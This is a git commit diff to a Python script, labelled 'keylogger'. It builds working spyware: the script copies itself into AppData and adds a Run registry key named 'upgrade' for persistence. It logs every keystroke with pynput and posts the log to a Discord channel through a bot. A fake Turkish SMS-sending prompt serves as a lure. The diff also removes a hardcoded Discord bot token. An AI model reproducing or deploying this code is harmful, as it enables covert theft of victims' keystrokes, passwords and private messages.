a76b095265ed3644837e3c9c9e21b5b9b767d518
Harlexq <serhanbakir5@gmail.com>
2023-08-29 23:28:00 +0300

    keylogger

--- main.py
+++ main.py
@@ -1,26 +1,39 @@
 import pynput.keyboard
 import discord
 from discord.ext import commands
+import threading
+import subprocess
+import os
+import shutil
+import sys
+
+def addToRegistry():
+    newFile = os.path.join(os.environ["appdata"], "main.exe")
+
+    if not os.path.exists(newFile):
+        shutil.copyfile(sys.executable, newFile)
+        regeditCommand = f'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "{newFile}"'
+        subprocess.call(regeditCommand, shell=True)
+
+addToRegistry()
 
 intents = discord.Intents.default()
 intents.typing = True
 intents.presences = False
 intents.messages = True
 
-token = "MTE0NDY2OTc3MTY2MTU4MjQ0Ng.GuBejd.6nGnLbkYQLahCwGWwCHdR6Q3bVmZGcXf7o4qMY"
-channelID = 1144662908358365369
+token = "" # Enter your discord token
+channelID = 1144662908358365369 # Enter your discord channel ID
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 log = ""
 keyloggerListener = None
 
-
-@bot.event
-async def on_ready():
-    print(f"Bot logged in as {bot.user.name}")
-    start_keylogger()
-
+def run_keylogger():
+    global keyloggerListener
+    keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)
+    keyloggerListener.start()
 
 def callbackFunction(key):
     global log
@@ -34,8 +47,21 @@ def callbackFunction(key):
     except:
         pass
 
-    print(log)
+def stop_keylogger():
+    global keyloggerListener
+    if keyloggerListener:
+        keyloggerListener.stop()
+        keyloggerListener.join()
 
+@bot.event
+async def on_ready():
+    print(f"Bot logged in as {bot.user.name}")
+    threading.Thread(target=run_keylogger).start()
+
+telNo = input("Telefon Numarası: +90")
+sms = input("SMS Adeti:" )
+
+print(f"{telNo} Numarasına {sms} Adet SMS Gönderiliyor")
 
 @bot.event
 async def on_message(message):
@@ -46,23 +72,8 @@ async def on_message(message):
         if log:
             await message.channel.send(log)
 
-
-def start_keylogger():
-    global keyloggerListener
-    keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)
-    keyloggerListener.start()
-
-
-def stop_keylogger():
-    global keyloggerListener
-    if keyloggerListener:
-        keyloggerListener.stop()
-        keyloggerListener.join()
-
-
 @bot.event
 async def on_disconnect():
     stop_keylogger()
-
 
 bot.run(token)
